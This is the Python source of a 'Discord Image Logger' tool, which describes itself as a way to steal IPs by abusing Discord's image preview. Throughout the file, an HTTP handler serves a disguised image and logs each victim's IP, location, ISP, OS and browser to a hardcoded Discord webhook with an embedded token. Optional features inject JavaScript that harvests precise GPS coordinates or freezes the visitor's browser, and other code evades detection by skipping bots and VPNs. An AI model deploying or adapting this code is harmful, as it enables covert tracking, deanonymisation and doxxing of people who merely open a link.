# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
